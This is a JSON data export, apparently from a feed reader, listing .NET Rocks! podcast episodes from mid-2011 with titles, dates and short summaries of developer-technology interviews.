{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=703","title":"Greg Philpott Develops in X++","published":{"$wrap":"$date","v":1317700800000,"h":"2011-10-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Greg Philpott about X++, the most popular language you've never heard of. X++ is the programming language for Microsoft Dynamics AX, an Enterprise Resource Planning product formerly known as Navision. Greg digs into how X++ allows programmers to extend Dynamics AX, adding whole new modules as well as customizing behavior in the existing system.","author":false,"_id":{"$wrap":"$oid","v":189}}
{"k":"0000000082","o":"0000000764","v":"001"}
{"_id":190,"_uid":190,"_dt":1373728933860,"_s":"1d0b7bcc18319bbc96a6395786356514"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=702","title":"Guy Smith-Ferrier Does Mind Control!","published":{"$wrap":"$date","v":1317268800000,"h":"2011-09-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Guy Smith-Ferrier about the Emotiv EPOC neuroheadset. No really! Mind control for .NET! Guy talks about how the headset is wireless and works with 16 different sensors positioned around the head. The headset is able to detect expressions, head movements, cognitive thoughts and emotions. Guy discusses how the SDK makes it simple to capture the headset data into .NET. Its easy to program, the question is, what would you do?","author":false,"_id":{"$wrap":"$oid","v":190}}
{"k":"0000000082","o":"0000000764","v":"001"}
{"_id":191,"_uid":191,"_dt":1373728933861,"_s":"5e528e1cd1e40df09d5dcd0c46a28463"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=701","title":"Jeremiah Peschka Stores Data in CorrugatedIron","published":{"$wrap":"$date","v":1317096000000,"h":"2011-09-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jeremiah Peschka about his project, CorrugatedIron, a .NET library that gives developers the ability to talk to Riak, Basho's highly-available Key-Value store. The conversation starts with understanding Riak, which is based on Amazon's Dynamo white paper for dynamic distributed storage. Along the way the topics of NoSQL as a whole, distributed data storage, load balancing and functional programming are explored.","author":false,"_id":{"$wrap":"$oid","v":191}}
{"k":"0000000082","o":"0000000657","v":"001"}
{"_id":192,"_uid":192,"_dt":1373728933862,"_s":"a57bf322ec0e80ec51136554d340aaa9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=700","title":"Show 700 - What happened at BUILD did NOT stay at BUILD","published":{"$wrap":"$date","v":1316664000000,"h":"2011-09-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard took thier recording rig to Tim Huckaby's epic party the night before Steven Sinofsky's keynote at the Microsoft BUILD conference September 13, 2011. They asked the industry insiders to speculate on what they would see. This is an interesting show simply because the veil of secrecy has finally been lifted.","author":false,"_id":{"$wrap":"$oid","v":192}}
{"k":"0000000082","o":"0000000655","v":"001"}
{"_id":193,"_uid":193,"_dt":1373728933863,"_s":"505f4f41cf6890fea9b32d4c471dd686"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=699","title":"Jay Schmelzer Builds Apps With LightSwitch","published":{"$wrap":"$date","v":1316491200000,"h":"2011-09-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jay Schmelzer about LightSwitch. Jay talks about the launch of LightSwitch back on July 26 2011, and the new set of extensions available to help Visual Studio Pro developers support LightSwitch applications. He also reminds us that if you own Visual Studio 2010, you own LightSwitch, so take it out for a spin!","author":false,"_id":{"$wrap":"$oid","v":193}}
{"k":"0000000082","o":"0000000764","v":"001"}
{"_id":194,"_uid":194,"_dt":1373728933864,"_s":"ca152e8d72f8274dcce59bf0b86bbcfd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=698","title":"Carl and Richard Return To Space!","published":{"$wrap":"$date","v":1316059200000,"h":"2011-09-15T04:00:00.000Z"},"starred":false,"read":false,"content":"You asked for it, you got it - another space show! This time around Carl and Richard talk about the latest news around commercial space, including new contracts for SpaceX and Orbital Science to fly to the ISS. They discuss the impact of the failure of a Russian Soyuz rocket carrying a Progress cargo ship to the ISS. Then they have some real fun and dive into the space debris debate and the potential of space elevators. Another total space geek out!","author":false,"_id":{"$wrap":"$oid","v":194}}
{"k":"0000000082","o":"0000000573","v":"001"}
{"_id":195,"_uid":195,"_dt":1373728933864,"_s":"41d85d2f84f642231f714c4e41957a1f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=697","title":"James Dawson and Grace Mollison Bridge the Gap Between Developers and Operations","published":{"$wrap":"$date","v":1315886400000,"h":"2011-09-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to James Dawson and Grace Mollison about the DevOps movement. DevOps is about developers and operations personnel working closely together to deliver higher quality, more reliable applications.","author":false,"_id":{"$wrap":"$oid","v":195}}
{"k":"0000000082","o":"0000000730","v":"001"}
{"_id":196,"_uid":196,"_dt":1373728933865,"_s":"819df5bc3082b50ce5a3a5f14cea47ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=696","title":"Billy Cravens Compares and Contrasts ColdFusion and ASP.NET","published":{"$wrap":"$date","v":1315454400000,"h":"2011-09-08T04:00:00.000Z"},"starred":false,"read":false,"content":"After Richard made some (somewhat) disparaging remarks about ColdFusion, Billy sent an email defending the platform. The outcome of that email discussion is this show - Carl and Richard get educated by Billy about what ColdFusion is about. ColdFusion goes back to 1995, and is still going strong at version 10! Billy talks about the similarities and differences between ColdFusion and ASP.NET.","author":false,"_id":{"$wrap":"$oid","v":196}}
{"k":"0000000082","o":"0000000907","v":"001"}
{"_id":197,"_uid":197,"_dt":1373728933866,"_s":"d574fc8bfba6cbd0d4076497562ba7f0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=695","title":"Kate Gregory on the History of C, C++ and C++0x.","published":{"$wrap":"$date","v":1315281600000,"h":"2011-09-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kate Gregory about the history of C, culminating in the latest version, C++0x (aka C++ 11). Kate points out that C++ is more popular than ever, no matter what the managed memory folks are saying. The conversation works through the various flavors of C, how the language has continued to evolve, even to the point of doing memory management! Along the way Kate digs into the new features of C++0x, many of which (like lambdas) seem awfully familiar... the conversation ends on a great discussion on massive parallelism. Could C++ solve the parallel problem?","author":false,"_id":{"$wrap":"$oid","v":197}}
{"k":"0000000082","o":"0000000759","v":"001"}
{"_id":198,"_uid":198,"_dt":1373728933867,"_s":"c0f34452737f83d0794448acdc5c5ab7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=694","title":"Kerry Hammil Builds .NET Gadgets","published":{"$wrap":"$date","v":1314849600000,"h":"2011-09-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kerry Hammil about .NET Gadgeteer. The .NET Gadgeteer project comes out of Microsoft Research and is advancing the .NET Micro Framework with new hardware that does not require experienced electronics people to be successful with. Everything is plug-and-play! The conversation moves on to what would happen when everything in your house has an IP address and further on into the Internet of Things. Another good geekout show!","author":false,"_id":{"$wrap":"$oid","v":198}}
{"k":"0000000082","o":"0000000748","v":"001"}
{"_id":199,"_uid":199,"_dt":1373728933869,"_s":"2a282f01558ebbe4f74eb906b54e0dcb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=693","title":"Nat Friedman and Miguel de Icaza Start Xamarin","published":{"$wrap":"$date","v":1314676800000,"h":"2011-08-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Nat Friedman and Miguel de Icaza, the CEO and CTO (respectively) of Xamarin. Xamarin is the company that Nat and Miguel set up to house the Mono Project and the rest of the Mono related products including MonoTouch and Mono for Android after Attachmate acquired Novell. The conversation starts out on mobile development and moves to tablets. Click the link below for a 20% discount on Xamarin tools!","author":false,"_id":{"$wrap":"$oid","v":199}}
{"k":"0000000082","o":"0000000682","v":"001"}
{"_id":200,"_uid":200,"_dt":1373728933870,"_s":"3475abfc4a114e8cb4515168d7ce6cf0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=692","title":"Emily Lewis Builds the Web One MicroFormat at a Time","published":{"$wrap":"$date","v":1314244800000,"h":"2011-08-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Emily Lewis about HTML5, CSS3, Microformats, and general web development topics. Emily calls herself a 'standardista' and demonstrates that in the conversation, talking about the advantage of using schemas to identify different types of data in your web pages. Could this be the return of XML schemas in a way that makes sense?","author":false,"_id":{"$wrap":"$oid","v":200}}
{"k":"0000000082","o":"0000000682","v":"001"}
{"_id":201,"_uid":201,"_dt":1373728933871,"_s":"b273a9f1f92cb5dda08ef2e7be68eed6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=691","title":"Loren Goodman Programs By the Rules","published":{"$wrap":"$date","v":1314072000000,"h":"2011-08-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Loren Goodman from InRule Technologies about rule engines. Loren talks about how rule engines help applications organize rules so that non-developers can modify them. The goal is to reduce maintenance costs for software. The conversation moves over to concepts of complex event processing and how it applies to developing new rules dynamically.","author":false,"_id":{"$wrap":"$oid","v":201}}
{"k":"0000000082","o":"0000000600","v":"001"}
{"_id":202,"_uid":202,"_dt":1373728933872,"_s":"87db2716da5087d2ee56bd7c2b29973a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=690","title":"JD Meier Gets Results the Agile Way","published":{"$wrap":"$date","v":1313640000000,"h":"2011-08-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to JD Meier from Microsoft about leading an agile life. JD talks about how he learned to be effective as a product manager at Microsoft, and how that lead to developing the Agile Life book. It may have a developer undertone, but the Agile Life is aimed at everyone.","author":false,"_id":{"$wrap":"$oid","v":202}}
{"k":"0000000082","o":"0000000756","v":"001"}
{"_id":203,"_uid":203,"_dt":1373728933872,"_s":"7e1a3eeec0cd6f268b3aadf242ddae2a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=689","title":"Shaun Walker Talks A Little DNN 6","published":{"$wrap":"$date","v":1313467200000,"h":"2011-08-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Shaun Walker about DotNetNuke. Shaun talks about the release of DotNetNuke 6, offering some substantial changes to DNN, including migrating to C# (from VB.NET). The conversation also digs into the lifestyle of having a dominant community (read: free) edition of your product vs. the commercial edition. Shaun also talks about how web development has evolved since the early days of ASP.NET. And it runs in Windows Azure!","author":false,"_id":{"$wrap":"$oid","v":203}}
{"k":"0000000082","o":"0000000642","v":"001"}
{"_id":204,"_uid":204,"_dt":1373728933873,"_s":"562d7bfd52ef3728d80b9375dccd7c8d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=688","title":"Carl and Richard Space Out!","published":{"$wrap":"$date","v":1313035200000,"h":"2011-08-11T04:00:00.000Z"},"starred":false,"read":false,"content":"You asked for it - Carl and Richard geek out about space. With the space shuttle retiring, the boys debate the relative merits of the shuttle program and where space should go next. Carl loves Virgin Galactic and Richard loves SpaceX. But what about Armadillo Aerospace and Bigelow Space? Join the boys for a good old fashioned geek out.","author":false,"_id":{"$wrap":"$oid","v":204}}
{"k":"0000000082","o":"0000000872","v":"001"}
{"_id":205,"_uid":205,"_dt":1373728933874,"_s":"961b319c874dc115ef9985832cb43971"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=687","title":"Tatham Oddie Makes HTML 5 and Silverlight Play Nice Together","published":{"$wrap":"$date","v":1312862400000,"h":"2011-08-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tatham Oddie about building web applications using HTML 5 *and* Silverlight. Tatham talks about the idea that the two technologies are not mutually exclusive - that you can take advantage of the mix of browsers and plugins to build the best experience possible for users. The conversation also moves into data and connectivity in general, ending up on cloud platforms. Tatham talks about how Azure can't scale down far enough, that technologies like AppHarbor are filling in the bottom end of the cloud story.","author":false,"_id":{"$wrap":"$oid","v":205}}
{"k":"0000000082","o":"0000000629","v":"001"}
{"_id":206,"_uid":206,"_dt":1373728933875,"_s":"92666c556ed5dfee2d3ebd8ae6e67a92"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=686","title":"Cristian Libardo Builds a CMS","published":{"$wrap":"$date","v":1312430400000,"h":"2011-08-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Cristian Libardo about N2 CMS. N2 CMS is an open source CMS system designed to be very light weight and allow developers to work with editors to build great web sites. Cristian talks about how N2 CMS focuses on strongly typed code to define structure to the web site and only content in databases.","author":false,"_id":{"$wrap":"$oid","v":206}}
{"k":"0000000082","o":"0000000879","v":"001"}
{"_id":207,"_uid":207,"_dt":1373728933876,"_s":"96d2f8234bb29de771bd51283a401111"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=685","title":"Julie Lerman Frames Our Entities","published":{"$wrap":"$date","v":1312257600000,"h":"2011-08-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Julie Lerman about Entity Framework. Julie talks about her Entity Framework books - one for EF1, the other for EF4. The conversation digs into Entity Framework 4.1 and the key features added, as well as the June CTP which added even more. Julie talks about enum support in the CTP, which was the most demanded feature, but then goes onto the other cool areas of the CTP, including new model support, spatial, table-value functions and support for stored procedures that return multiple record sets. Julie gets us up to date on Entity Framework!","author":false,"_id":{"$wrap":"$oid","v":207}}
{"k":"0000000082","o":"0000000870","v":"001"}
{"_id":208,"_uid":208,"_dt":1373728933877,"_s":"e2ab85a4acf1269214f3279cbd65d081"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=684","title":"Pete Brown Has Fun With Silverlight and More!","published":{"$wrap":"$date","v":1311825600000,"h":"2011-07-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Pete Brown from Microsoft about the cool things he's working on, including building a Commodore 64 emulator in Silverlight! Pete also touches on the fact that Silverlight is not dying at all - there's lots of good things going on! The conversation digs into Pete's favorite new features of Silverlight 5. Pete is the author of Silverlight 5 in Action, you can get a discount by using code s5ia38 at the Manning web site. Ultimately the conversation ends up on the .NET Micro Framework and MIDI - music and geekery collide!","author":false,"_id":{"$wrap":"$oid","v":208}}
{"k":"0000000082","o":"0000000780","v":"001"}
{"_id":209,"_uid":209,"_dt":1373728933878,"_s":"d2264a7f47aff4e096c3cd4f47305971"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=683","title":"Mark Rendle Has Some Simple.Data","published":{"$wrap":"$date","v":1311652800000,"h":"2011-07-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mark Rendle about Simple.Data. As Mark describes it, Simple.Data is not an ORM because there's no objects and no relational mapping. Simple.Data is a dynamic data utility to make your data persistence layer as light weight as possible. Mark also talks about Nancy, a light-weight web development framework. The conversation also moves to OWIN, the Open Web Server Interface. The show wraps up with Mark's insights on simpler, more open software.","author":false,"_id":{"$wrap":"$oid","v":209}}
{"k":"0000000082","o":"0000000867","v":"001"}
{"_id":210,"_uid":210,"_dt":1373728933879,"_s":"51e958ec4f66ee3a9772147b47a92d34"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=682","title":"Brad Abrams Builds Platforms for Google","published":{"$wrap":"$date","v":1311220800000,"h":"2011-07-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brad Abrams late of Microsoft, now at Google. Recently moved to Palo Alto, Brad talks about Google+, Google's social networking application for sharing thoughts, pictures and video. Brad has just joined the team to start developing API for developers to work with Google+. The conversation moves onto Google's Web Toolkit and App Engine, products Brad spent his first year at Google on. Brad digs into his thinking around building platforms, what it really means to compile, and his experiences in different company cultures.","author":false,"_id":{"$wrap":"$oid","v":210}}
{"k":"0000000082","o":"0000000884","v":"001"}
{"_id":211,"_uid":211,"_dt":1373728933880,"_s":"4aa4b8cdf7769571c4f179c325a959c2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=681","title":"Rey Bango is all about Javascript","published":{"$wrap":"$date","v":1311048000000,"h":"2011-07-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Rey Bango from Microsoft about his web development career. Rey has deep ties into the Javascript community and talks about how Javascript development process has evolved. Today Rey takes care of the Script Junkies web site at Microsoft with some awesome cross browser content and code. The conversation also digs into the state of HTML 5 and it's potential in mobile development. Rey also walks through his tool kit of Javascript libraries. The show closes with a discussion about jsMentors, a site focused on helping Javascript developers improve.","author":false,"_id":{"$wrap":"$oid","v":211}}
{"k":"0000000082","o":"0000000807","v":"001"}
{"_id":212,"_uid":212,"_dt":1373728933881,"_s":"4096b639889893a27911ba544df5eddc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=680","title":"Sebastien Lambla Builds OpenRasta","published":{"$wrap":"$date","v":1310616000000,"h":"2011-07-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Sebastien Lambla about OpenRasta and OpenWrap. OpenRasta is a framework for simplifying building resource-oriented web-based applications. OpenRasta can work with ASP.NET or directly with HTTP.SYS. OpenRasta will work side-by-side with ASP.NET MVC, Webforms and more. Sebastien also talks about OpenWrap, a package manager for .NET that helps OpenRasta stay lean but extensible. Sebastien also speaks passionately about the role of Open Source in the Microsoft community.","author":false,"_id":{"$wrap":"$oid","v":212}}
{"k":"0000000082","o":"0000000741","v":"001"}
{"_id":213,"_uid":213,"_dt":1373728933883,"_s":"75dc6d798bf9b152486ed13dc07cedf0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=679","title":"Geoff Smith and Howard van Rooijen Architect S#arply","published":{"$wrap":"$date","v":1310443200000,"h":"2011-07-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Geoff Smith and Howard van Rooijen about S#arp architecture. S#arp architecture provides guidance on how to build ASP.NET MVC applications with nHibernate. It follows Eric Evan's Domain Driven Design principles very closely. The conversation also jumped over to StyleCop, the CodePlex project for standardizing code standards and Templify, an open source tool for building T4 templates.","author":false,"_id":{"$wrap":"$oid","v":213}}
{"k":"0000000082","o":"0000000555","v":"001"}
{"_id":214,"_uid":214,"_dt":1373728933884,"_s":"725fb2254eef67380fc316dbb32b07f6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=678","title":"Uncle Bob Looks For Clojure at NDC","published":{"$wrap":"$date","v":1310011200000,"h":"2011-07-07T04:00:00.000Z"},"starred":false,"read":false,"content":"One more show from NDC - a silly one. Late in the conference, Carl and Richard talked to Uncle Bob Martin about professionalism, clean code and the Clojure language. Lots of jokes and giggling in this one - we were all getting a little punchy!","author":false,"_id":{"$wrap":"$oid","v":214}}
{"k":"0000000082","o":"0000000613","v":"001"}
{"_id":215,"_uid":215,"_dt":1373728933884,"_s":"b6aad532b09c87e750b223325fc254e1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=677","title":"Mobile Development Panel Discussion from NDC!","published":{"$wrap":"$date","v":1309838400000,"h":"2011-07-05T04:00:00.000Z"},"starred":false,"read":false,"content":"What, another mobile panel? Yes - a totally different one. This mobile panel discussion was recorded at the Norwegian Developer Conference. Lots of strong debate about HTML 5 vs. native applications, the power and problems of PhoneGap and how app stores are breaking down. Not to be missed!","author":false,"_id":{"$wrap":"$oid","v":215}}
{"k":"0000000082","o":"0000000650","v":"001"}
{"_id":216,"_uid":216,"_dt":1373728933885,"_s":"3995865025468aac9bfb43335d1e8ddb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=676","title":"Scott Guthrie at NDC!","published":{"$wrap":"$date","v":1309406400000,"h":"2011-06-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Fresh off his keynote at the Norwegian Developers Conference in Oslo, Norway, Scott Guthrie dropped into the fishbowl to talk to Carl and Richard about his new role with the Azure team. Scott digs into how Azure has evolved and his focus on improving the developer experience. The conversation wraps up with a chat about the upcoming Build conference.","author":false,"_id":{"$wrap":"$oid","v":216}}
{"k":"0000000082","o":"0000000798","v":"001"}
{"_id":217,"_uid":217,"_dt":1373728933886,"_s":"75444ed12715e26c2f03efc344152b41"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=675","title":"Ingo Rammer Builds Native HTML 5 Apps","published":{"$wrap":"$date","v":1309233600000,"h":"2011-06-28T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference in Oslo, Norway, Carl and Richard talk to Ingo Rammer about building 'native' HTML 5 apps. Ingo talks about PhoneGap, a wrapper over HTML for building applications that run on all mobile platforms. But then he goes further, talking about other variations on the idea of using HTML 5 as the presentation markup while still being able to connect to the native resources of the platform. Could this be the programming platform of the future?","author":false,"_id":{"$wrap":"$oid","v":217}}
{"k":"0000000082","o":"0000000809","v":"001"}
{"_id":218,"_uid":218,"_dt":1373728933887,"_s":"f36f8cd22bfe8ed69cb3eea4d973366a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=674","title":"Dominick Baier Walks Us Through Claims-Based Security!","published":{"$wrap":"$date","v":1308801600000,"h":"2011-06-23T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference in Oslo, Carl and Richard sat down with Dominick Baier to talk about claims-based security. Dominick walks through the entire claims-based security process, separating identity claims from resource claims, how to actually work with active directory in a sensible way and how the whole thing comes together in your code in a way that won't make you cry every time you need to make a change. The time for claims-based security is now!","author":false,"_id":{"$wrap":"$oid","v":218}}
{"k":"0000000082","o":"0000000613","v":"001"}
{"_id":219,"_uid":219,"_dt":1373728933888,"_s":"87fcf955d23e2ea1f83cd984bf860a63"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=673","title":"Stories from NDC!","published":{"$wrap":"$date","v":1308628800000,"h":"2011-06-21T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developer Conference, Carl and Richard collected a couple of stories from the speakers at the event. First up is Magnus Mårtensson and Björn Ekengren talking about Java on Azure. No really! Next, Gill Cleeran and Kevin Dockx talk about where Silverlight is going... to version five and beyond!","author":false,"_id":{"$wrap":"$oid","v":219}}
{"k":"0000000082","o":"0000000666","v":"001"}
{"_id":220,"_uid":220,"_dt":1373728933889,"_s":"4253702224e92b445803f59950e8535a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=672","title":"Aspect Oriented Programming at NDC","published":{"$wrap":"$date","v":1308196800000,"h":"2011-06-16T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference, Carl and Richard moderated a panel discussion on Aspect Oriented Programming. The discussion ranges over a diverse number of scenarios that aspects make sense for, how you can get in trouble with aspects, and the various aspect toolsets that exist. The audience jumps in with lots of questions for panelists.","author":false,"_id":{"$wrap":"$oid","v":220}}
{"k":"0000000082","o":"0000000640","v":"001"}
{"_id":221,"_uid":221,"_dt":1373728933890,"_s":"7825e4b3b211517f5531cf4868bb09de"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=671","title":"Paul Bone Goes Parallel with Project Mercury","published":{"$wrap":"$date","v":1308024000000,"h":"2011-06-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Paul Bone about the Mercury Project. Mercury is a logic programming language designed to natually execute in parallel without requiring the programmer to understand much about parallelism. Get ready for some brain-twisting - this sort of programming is quite different from what you're use to!","author":false,"_id":{"$wrap":"$oid","v":221}}
{"k":"0000000082","o":"0000000831","v":"001"}
{"_id":222,"_uid":222,"_dt":1373728933891,"_s":"a6e578f12da10e17c11368857333462b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=670","title":"Mobile Development Panel Discussion from DevTeach","published":{"$wrap":"$date","v":1307592000000,"h":"2011-06-09T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevTeach in Montreal, Carl and Richard sat down with a panel of mobile development experts to talk about where mobile development is at. The development process for iPhone, Android, Blackberry and Windows Phone 7 was explored. The conversation also dug into the potential of MonoTouch and Mono for Android, alternative ways of building applications for iPhone and Android respectively. Finally, the debate dug into HTML 5 and the dream of building an application once that runs on all platforms.","author":false,"_id":{"$wrap":"$oid","v":222}}
{"k":"0000000082","o":"0000000909","v":"001"}
{"_id":223,"_uid":223,"_dt":1373728933892,"_s":"e5bb6c15079ab6f131781962ec5f9e61"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=669","title":"David Neilsen Develops for the Cloud","published":{"$wrap":"$date","v":1307419200000,"h":"2011-06-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to David Neilsen about doing cloud development. David digs into the various flavors of cloud, defining the differences between Platform-as-a-Service,  Infrastructure-as-a-Service and Software-as-a-Service. David is one of the original organizers of CloudCamp, free one day events to help people get started with the cloud. The conversation then digs into the challenge of migrating existing .NET applications to Azure. David finishes by defining the core criteria of cloud computing: On-Demand, Self-Service, Scalable, Measurable. The acronym is OSSM, pronounced 'awesome.'","author":false,"_id":{"$wrap":"$oid","v":223}}
{"k":"0000000082","o":"0000000695","v":"001"}
{"_id":224,"_uid":224,"_dt":1373728933893,"_s":"b557ece9e82cda5e6d188567a00746e1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=668","title":"Stories from Tech Ed US!","published":{"$wrap":"$date","v":1306987200000,"h":"2011-06-02T04:00:00.000Z"},"starred":false,"read":false,"content":"While at Tech Ed US in Atlanta, Carl and Richard talked to a variety of folks about the work they're doing in .NET. First up was Geert van de Horrik, talking about the Catel MVVM framework. Then Miguel Castro talked about MVVM. We also caught up with Stephen Rose who discussed Windows InTune. And finally, Tod Anglin from Telerik talked a bit about HTML 5. These are the stories from Tech Ed!","author":false,"_id":{"$wrap":"$oid","v":224}}
{"k":"0000000082","o":"0000000841","v":"001"}
{"_id":225,"_uid":225,"_dt":1373728933894,"_s":"27f16de0a7d79945ad46d02dabe8725a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=667","title":"Michele Leroux Bustamante Still Focused on Identity","published":{"$wrap":"$date","v":1306814400000,"h":"2011-05-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Michele Leroux Bustamante about identity. Michele starts the conversation with the state of the union on identity. She walks through the evolution of identity concepts and how the various peices are being implemented. Michele also talks about the rise of REST-based identity (as opposed to SOAP-based) and the efforts to simplify identity. She also talks about Access Control Services (ACS), which is part of Azure AppFabric. oAuth, OpenID, Claims-Based Identity... this show has it all!","author":false,"_id":{"$wrap":"$oid","v":225}}
{"k":"0000000082","o":"0000000721","v":"001"}
{"_id":226,"_uid":226,"_dt":1373728933895,"_s":"c1b702f1f0a5ed10d14d878e3b596b0f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=666","title":"Steve Smith Tells Performance Stories","published":{"$wrap":"$date","v":1306382400000,"h":"2011-05-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Ignoring the unusual show number, Steve Smith talks to Carl and Richard about his experiences tuning ASP.NET for better performance. Steve tells three different stories from different eras of web development, also digging into situations where he's made mistakes, where he's found mistakes, and when he wished he'd called Microsoft tech support sooner. Don't let the number scare you, this is a great show!","author":false,"_id":{"$wrap":"$oid","v":226}}
{"k":"0000000082","o":"0000000670","v":"001"}
{"_id":227,"_uid":227,"_dt":1373728933895,"_s":"3f8749cac12de18d222d29658b9325e1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=665","title":"Mark Arteaga Talks Windows Phone 7 and Mango","published":{"$wrap":"$date","v":1306209600000,"h":"2011-05-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mark Arteaga about his experiences building Windows Phone 7 applications. The conversation starts with a run down of what's coming in the upcoming Mango release. Mark then digs into the challenges of small teams building games for the phone, and what enterprise developers are going to need to be successful with the phone.","author":false,"_id":{"$wrap":"$oid","v":227}}
{"k":"0000000082","o":"0000000911","v":"001"}
{"_id":228,"_uid":228,"_dt":1373728933896,"_s":"3c7f998cfd08199b709aaff97e3091e4"}
